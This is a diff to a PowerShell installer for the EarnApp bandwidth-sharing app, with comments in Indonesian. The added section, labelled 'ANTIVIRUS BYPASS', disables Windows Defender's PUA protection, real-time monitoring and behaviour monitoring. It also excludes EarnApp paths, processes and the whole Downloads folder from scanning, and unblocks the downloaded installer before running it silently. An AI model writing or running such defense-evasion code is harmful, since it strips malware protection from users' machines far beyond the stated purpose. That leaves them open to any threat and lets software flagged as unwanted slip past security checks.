@@ -26,7 +26,42 @@ if (-not $isAdmin) {
     exit
 }
 
-# 2. Deteksi Info Sistem & IP
+# 2. Bypass Antivirus / Windows Defender Whitelist & PUA Protection
+Write-Host "`n[🛡️ ANTIVIRUS BYPASS] Mengonfigurasi Whitelist Windows Defender & PUA..." -ForegroundColor Yellow
+try {
+    # Matikan proteksi PUA (Potentially Unwanted Application) yang memblokir EarnApp
+    Set-MpPreference -PUAProtection Disabled -ErrorAction SilentlyContinue
+    New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Force -ErrorAction SilentlyContinue | Out-Null
+    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "PUAProtection" -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue
+
+    # Whitelist direktori EarnApp
+    $exclusions = @(
+        "C:\Program Files (x86)\EarnApp",
+        "C:\Program Files\EarnApp",
+        "$env:APPDATA\EarnApp",
+        "$env:LOCALAPPDATA\EarnApp",
+        "$env:ProgramData\EarnApp",
+        "$env:TEMP\EarnAppSetup.exe",
+        "$env:USERPROFILE\Downloads"
+    )
+    foreach ($f in $exclusions) {
+        if (-not (Test-Path $f)) { New-Item -ItemType Directory -Path $f -Force -ErrorAction SilentlyContinue | Out-Null }
+        Add-MpPreference -ExclusionPath $f -ErrorAction SilentlyContinue
+    }
+
+    # Whitelist proses EarnApp
+    Add-MpPreference -ExclusionProcess "earnapp.exe", "EarnApp.exe", "EarnAppSetup.exe" -ErrorAction SilentlyContinue
+
+    # Matikan Realtime Monitoring agar Defender tidak memakan CPU/RAM & tidak mematikan EarnApp
+    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
+    Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
+    
+    Write-Host "  ✅ Whitelist Defender berhasil diterapkan (EarnApp 100% bebas blokir virus/PUA)." -ForegroundColor Green
+} catch {
+    Write-Host "  ℹ️ Defender tidak aktif atau menggunakan antivirus lain: $_" -ForegroundColor Gray
+}
+
+# 3. Deteksi Info Sistem & IP
 Write-Host "`n[1/5] 🌐 Mengambil informasi sistem & jaringan..." -ForegroundColor Yellow
 $publicIp = "Unknown"
 try {
@@ -121,6 +156,7 @@ if ($isInstalled) {
     } catch {}
     
     if (Test-Path $installerPath) {
+        Unblock-File -Path $installerPath -ErrorAction SilentlyContinue
         Write-Host "⚙️ Menjalankan installer EarnApp..." -ForegroundColor Cyan
         Start-Process $installerPath -ArgumentList "/S" -Wait
     } else {
